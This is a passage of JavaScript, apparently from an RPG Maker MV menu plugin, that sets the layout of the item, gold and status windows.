    this._itemWindow = new Window_ItemList(0, wy, Graphics.boxWidth, wh);

    if (NCMenu.descrPlacement == 2) {this._itemWindow.y = this._categoryWindow.height};
    
    this._itemWindow.setHelpWindow(this._helpWindow);
    this._itemWindow.setHandler('ok',     this.onItemOk.bind(this));
    this._itemWindow.setHandler('cancel', this.onItemCancel.bind(this));
    this.addWindow(this._itemWindow);
    this._categoryWindow.setItemWindow(this._itemWindow);
};

Scene_Item.prototype.createGoldWindow = function() {
    this._goldWindow = new Window_Gold(0, 0);
    if (NCMenu.goldWindowAlignRight) {this._goldWindow.x = Graphics.boxWidth - NCMenu.goldWindowWidth}
    this.addWindow(this._goldWindow);
};
}; // End of Yanfly Item Core deference

//=============================================================================
// Window_Status - Streamlined
//=============================================================================

Window_Status.prototype.initialize = function() {
    var width = 440;
    var height = 180;
    Window_Selectable.prototype.initialize.call(this, (Graphics.boxWidth - width) / 2, (Graphics.boxHeight - height) / 2, width, height);
    this.refresh();
    this.activate();
};

Window_Status.prototype.refresh = function() {
    this.contents.clear();
    if (this._actor) {
        var lineHeight = this.lineHeight();
        this.drawBlock2(0);
    }
};

Window_Status.prototype.drawBlock2 = function(y) {
    this.drawActorFace(this._actor, 12, y);
    this.drawBasicInfo(204, y);
    this.drawExpInfo(456, y);
};

Window_Status.prototype.drawBasicInfo = function(x, y) {
    var lineHeight = this.lineHeight();
    this.drawActorName(this._actor, x, y + lineHeight * 0.5);
    this.drawActorHp(this._actor, x, y + lineHeight * 1.5);
    this.drawActorMp(this._actor, x, y + lineHeight * 2.5);
};
